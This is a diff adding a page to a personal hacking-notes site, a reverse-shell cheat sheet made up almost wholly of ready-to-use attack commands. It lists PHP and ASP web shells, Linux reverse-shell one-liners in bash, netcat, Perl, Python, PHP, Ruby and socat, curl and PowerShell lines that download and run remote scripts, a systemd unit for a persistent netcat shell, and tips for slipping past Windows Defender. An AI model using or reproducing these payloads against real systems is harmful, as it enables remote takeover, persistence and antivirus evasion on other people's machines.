@@ -1,0 +1,193 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Reverse Shells</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+    
+    <h1>Reverse Shells</h1>
+    
+    <hr>
+    
+    <h2>Web Shells</h2>
+    
+    <li>POST vs GET request shells</li>
+    <ul>
+        <li>$_REQUEST = POST request shell</li>
+        <li>Benefits of using a POST request shell</li>
+        <ul>
+            <li>Less likely to show up in logs</li>
+            <li>Less bad characters</li>
+        </ul>
+    </ul>
+    
+    <li>PHP</li>
+    <ul>
+        <li>&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;</li>
+        <li>&lt;?php system($_REQUEST[&#039;cmd&#039;]); ?&gt;</li>
+        <li>&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</li>
+        <li>&lt;?php system(&quot;&lt;bash command&gt;&quot;); ?&gt;</li>
+        <li>&lt;?php echo &quot;START&lt;br/&gt;&lt;br/&gt;\n\n\n&quot;; system($_GET[&quot;cmd&quot;]); echo &quot;\n\n\n&lt;br/&gt;&lt;br/&gt;END&quot;; ?&gt;</li>
+    </ul>
+    
+    <h4>asp and aspx</h4>
+    <table>
+        <tr>
+            <td>asp</td>
+            <td>
+                <li>vbscript based</li>
+                <li>Older (around 2003)</li>
+            </td>
+        </tr>
+        <tr>
+            <td>aspx</td>
+            <td>
+                <li>.net based</li>
+                <li>Newer</li>
+            </td>
+        </tr>
+    </table>
+    
+    <li>msfvenom</li>
+    <ul>
+        <li>msfvenom -f asp</li>
+        <li>msfvenom -f aspx</li>
+    </ul>
+    
+    <li>asp shells</li>
+    <ul>
+        <li>
+            <pre>&lt;%&#13;&#10;Set rs = CreateObject(&quot;WScript.Shell&quot;)&#13;&#10;Set cmd = rs.Exec(&quot;cmd /c whoami&quot;)&#13;&#10;o = cmd.StdOut.Readall()&#13;&#10;Response.write(o)&#13;&#10;%&gt;</pre>
+        </li>
+        <li>
+            <pre>&lt;%response.write CreateObject(&quot;WScript.Shell&quot;).Exec(Request.QueryString(&quot;cmd&quot;)).StdOut.Readall()%&gt;</pre>
+        </li>
+        <li>
+            <pre>&lt;%&#13;&#10;Dim oS&#13;&#10;On Error Resume Next&#13;&#10;Set oS = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)&#13;&#10;Call oS.Run(&quot;win.com cmd.exe /c c:\Inetpub\shell4444.exe&quot;,0,True)&#13;&#10;%&gt;</pre>
+        </li>
+    </ul>
+    
+    <hr>
+    
+    <h2>Linux Reverse Shells</h2>
+    
+    <h4>netcat reverse shell</h4>
+    <ul>
+        <li>Download netcat to victim machine if it does not already exist</li>
+        <li>nc &lt;ip address&gt; &lt;port&gt; -e /bin/bash</li>
+    </ul>
+    
+    <h4>Commands for reverse shells</h4>
+    <li>bash -c &#039;bash -i &gt;&amp; /dev/tcp/&lt;ip address&gt;/&lt;port&gt; 0&gt;&amp;1&#039;</li>
+    <li>curl http://&lt;ip address&gt;/shell.sh | bash</li>
+    <ul>
+        <li>bash /tmp/shell.sh</li>
+    </ul>
+    <li>wget http://&lt;ip address&gt;/shell.sh -O /tmp/shell.sh</li>
+    <ul>
+        <li>bash /tmp/shell.sh</li>
+    </ul>
+    <li>nc -e /bin/sh &lt;ip address&gt; &lt;port&gt;</li>
+    <li>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;ip address&gt; &lt;port&gt; &gt;/tmp/f</li>
+    <li>perl -e &#039;use Socket;$i=&quot;&lt;ip address&gt;&quot;;$p=&lt;port&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#039;</li>
+    <li>python -c &quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;&lt;ip address&gt;\&quot;,&lt;port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&quot;</li>
+    <li>php -r &quot;\$sock=fsockopen(\&quot;&lt;ip address&gt;\&quot;,&lt;port&gt;);exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&quot;</li>
+    <li>ruby -r socket -e &quot;f=TCPSocket.open(\&quot;&lt;ip address&gt;\&quot;,&lt;port&gt;).to_i;exec sprintf(\&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\&quot;,f,f,f)&quot;</li>
+    
+    <br>
+    
+    <h4>socat reverse shell</h4>
+    <table>
+        <tr>
+            <td>Set up listener</td>
+            <td>socat file:`tty`,raw,echo=0 tcp-listen:80</td>
+        </tr>
+        <tr>
+            <td>Execute reverse shell</td>
+            <td>socat tcp-connect:&lt;ip address&gt;:&lt;port&gt; exec:/bin/sh,pty,stderr,setsid,sigint,sane</td>
+        </tr>
+    </table>
+    
+    <br>
+    
+    <h4>Reverse shell using linux service</h4>
+    
+    <pre>&#13;&#10;[Service]&#13;&#10;Type=notify&#13;&#10;ExecStart=/bin/bash -c &apos;nc -e /bin/bash &lt;ip address&gt; &lt;port&gt;&apos;&#13;&#10;KillMode=process&#13;&#10;Restart=on-failure&#13;&#10;RestartSec=40s&#13;&#10;[Install]&#13;&#10;WantedBy=multi-user.target&#13;&#10;&#13;&#10;&#13;&#10;systemctl link &lt;.service file&gt;&#13;&#10;systemctl start &lt;service&gt;&#13;&#10;    </pre>
+    
+    <hr>
+    
+    <h2>Windows</h2>
+    
+    <li>Enumerating command execution</li>
+    <ul>
+        <li>&lt;command&gt;</li>
+        <li>cmd &lt;command></li>
+        <li>cmd.exe &lt;command&gt;</li>
+        <li>cmd /c &lt;command&gt;</li>
+        <li>cmd.exe /c &lt;command&gt;</li>
+        <li>C:\Windows\System32\cmd.exe &lt;command&gt;</li>
+    </ul>
+    
+    <li>Locations to write shell to:</li>
+    <ul>
+        <li>C:\Windows\System32\spool\drivers\color\</li>
+        <li>C:\Windows\Temp</li>
+    </ul>
+    
+    <h4>netcat reverse shell</h4>
+    <ul>
+        <li>Download netcat to Windows machine if it does not already exist</li>
+        <li>Try both nc.exe and nc64.exe</li>
+        <li>nc &lt;ip address&gt; &lt;port&gt; -e cmd</li>
+        <li>nc &lt;ip address&gt; &lt;port&gt; -e powershell</li>
+    </ul>
+    
+    <h4>Powershell reverse shell</h4>
+    <table>
+        <tr>
+            <td>Download and run powershell script</td>
+            <ul>
+                <li>Run with Nishang powershell reverse shell script</li>
+                <ul>
+                    <li>Windows Defender evasion</li>
+                    <ul>
+                        <li>If Windows is blocking the script from running</li>
+                        <ul>
+                            <li>Remove all usage comments from the reverse shell script</li>
+                            <li>Rename the shell file to something not suspicious</li>
+                            <li>Change the "Invoke" method name</li>
+                        </ul>
+                    </ul>
+                </ul>
+            </ul>
+            <td>
+                <li>powershell -c &quot;IEX(New-Object Net.WebClient).downloadString(&#039;http://&lt;ip address&gt;/shell.ps1&#039;)&quot;</li>
+                <li>powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#039;http://&lt;ip address&gt;/shell.ps1&#039;)&quot;</li>
+                <li>IEX(IWR http://&lt;ip address&gt;/shell.ps1 -UseBasicParsing)</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Base64 Encoded powershell</td>
+            <td>
+                <li>echo &quot;IEX(IWR http://&lt;ip address&gt;/shell.ps1 -UseBasicParsing)&quot; | iconv -t utf-16le | base64 -w 0</li>
+                <li>powershell -e &lt;Base64 Encoded Shell&gt;</li>
+                <li>powershell -EncodedCommand &lt;Base64 Encoded Shell&gt;</li>
+            </td>
+        </tr>
+    </table>
+    
+    <h4>socat reverse shell</h4>
+    <table>
+        <tr>
+            <td>Set up listener</td>
+            <td>socat file:`tty`,raw,echo=0 tcp-listen:80</td>
+        </tr>
+        <tr>
+            <td>Execute reverse shell</td>
+            <td>socat tcp-connect:&lt;ip address&gt;:&lt;port&gt; exec:/bin/sh,pty,stderr,setsid,sigint,sane</td>
+        </tr>
+    </table>
